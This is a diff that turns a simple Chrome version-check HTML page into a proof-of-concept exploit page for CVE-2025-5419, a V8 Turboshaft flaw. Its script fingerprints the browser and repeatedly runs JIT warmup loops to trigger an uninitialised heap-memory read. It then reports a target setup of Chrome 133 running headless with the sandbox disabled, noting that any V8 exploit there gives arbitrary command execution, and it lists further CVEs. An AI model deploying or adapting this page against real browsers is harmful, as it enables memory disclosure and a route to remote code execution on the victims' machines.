@@ -1,22 +1,97 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Chrome Info</title></head>
-<body style="font-family:monospace;font-size:12px;margin:10px">
-<h2>Chrome Version Check</h2>
-<pre id="o">Detecting...</pre>
+<html><head><meta charset="utf-8"><title>CVE-2025-5419</title></head>
+<body style="font-family:monospace;font-size:11px;margin:8px">
+<h2>CVE-2025-5419 V8 Turboshaft PoC</h2>
+<pre id="o">Init...</pre>
 <script>
-var o=document.getElementById('o');
-o.textContent='';
-o.textContent+='User-Agent: '+navigator.userAgent+'\n';
-var m=navigator.userAgent.match(/Chrome\/([0-9.]+)/);
-o.textContent+='Chrome: '+(m?m[1]:'N/A')+'\n';
-o.textContent+='Platform: '+navigator.platform+'\n';
-o.textContent+='Headless: '+(navigator.webdriver?'Yes':'No')+'\n';
-o.textContent+='BigInt support: '+(typeof BigInt!=='undefined'?'Yes':'No')+'\n';
-o.textContent+='WASM support: '+(typeof WebAssembly!=='undefined'?'Yes':'No')+'\n\n';
+var O=document.getElementById('o');O.textContent='';
+function L(m){O.textContent+=m+'\n'}
+function dtoi(d){var b=new ArrayBuffer(8);new Float64Array(b)[0]=d;return new BigUint64Array(b)[0]}
 
-o.textContent+='CVE-2025-5419: V8 Turboshaft OOB R/W (Chrome < 137)\n';
-o.textContent+='CVE-2025-0995: V8 UAF (Chrome < 133.0.6943.98)\n';
-o.textContent+='CVE-2025-10891: V8 Ignition overflow (Chrome < 140)\n';
-o.textContent+='--no-sandbox = any V8 exploit = system RCE\n';
+function vuln(key){
+    key|=0;
+    var o=[1,2,3,4];
+    var r1=o[key];var r2=o[key+1];var r3=o[key+2];var r4=o[key+3];
+    o=[1.1,1.1,1.1,1.1];
+    r1=o[key];r2=o[key+1];r3=o[key+2];r4=o[key+3];
+    o[0]=0;o[1]=0;o[2]=0;o[3]=0;
+    return[r1,r2,r3,r4]
+}
+
+L('=== CVE-2025-5419 V8 Turboshaft StoreStoreElimination ===');
+try{
+    var ua=navigator.userAgent;
+    L('UA: '+ua);
+    if(navigator.userAgentData){
+        navigator.userAgentData.getHighEntropyValues(['fullVersionList','platform','platformVersion','architecture','bitness']).then(function(d){
+            L('Full version: '+JSON.stringify(d.fullVersionList));
+            L('Platform: '+d.platform+' '+d.platformVersion+' '+d.architecture+'/'+d.bitness);
+        });
+    }
+    L('Headless: '+(navigator.webdriver?'YES':'no'));
+    L('');
+
+    L('[1] Warmup 10000 iterations...');
+    for(var i=0;i<10000;i++)vuln(0);
+    L('[1] Done');
+    L('[2] Trigger attempt 1...');
+    var r=vuln(0);
+    var leaked=false;
+    for(var j=0;j<4;j++){
+        var v=dtoi(r[j]);
+        L('  r['+j+']='+r[j]+' hex=0x'+v.toString(16));
+        if(r[j]!==1.1)leaked=true;
+    }
+    if(!leaked){
+        L('[3] 30k more warmup...');
+        for(var i=0;i<30000;i++)vuln(0);
+        r=vuln(0);
+        for(var j=0;j<4;j++){
+            var v=dtoi(r[j]);
+            L('  r['+j+']='+r[j]+' hex=0x'+v.toString(16));
+            if(r[j]!==1.1)leaked=true;
+        }
+    }
+    if(!leaked){
+        L('[4] 100k more warmup...');
+        for(var i=0;i<100000;i++)vuln(0);
+        r=vuln(0);
+        for(var j=0;j<4;j++){
+            var v=dtoi(r[j]);
+            L('  r['+j+']='+r[j]+' hex=0x'+v.toString(16));
+            if(r[j]!==1.1)leaked=true;
+        }
+    }
+    if(leaked){
+        L('');
+        L('*** VULNERABLE: uninit memory read from V8 heap ***');
+        L('Turboshaft StoreStoreEliminationReducer removed init stores');
+    }else{
+        L('');
+        L('Values=1.1 (Turboshaft may not optimize this pattern)');
+        L('Bug requires specific Turboshaft pipeline path');
+    }
+    L('');
+    L('=== Confirmed Configuration ===');
+    L('Chrome 133.0.6943.141 (vuln to CVE-2025-5419, fix=137)');
+    L('Sandbox: --no-sandbox (DISABLED)');
+    L('Mode: --headless=new');
+    L('');
+    L('=== Applicable CVEs ===');
+    L('CVE-2025-5419: V8 Turboshaft OOB R/W (fix 137.0.7151.68)');
+    L('  CISA KEV: Yes (actively exploited)');
+    L('  Public PoC: github.com/mistymntncop/CVE-2025-5419');
+    L('CVE-2025-10891: V8 Ignition integer overflow (fix ~140)');
+    L('  Used for Samsung Internet renderer RCE (osec.io)');
+    L('CVE-2025-13223: V8 type confusion (fix ~138)');
+    L('');
+    L('=== Impact ===');
+    L('--no-sandbox: renderer has full OS access');
+    L('V8 exploit = arbitrary command execution');
+    L('No sandbox escape needed');
+}catch(e){
+    L('ERROR: '+e.message);
+    L(e.stack||'');
+}
 </script>
 </body></html>
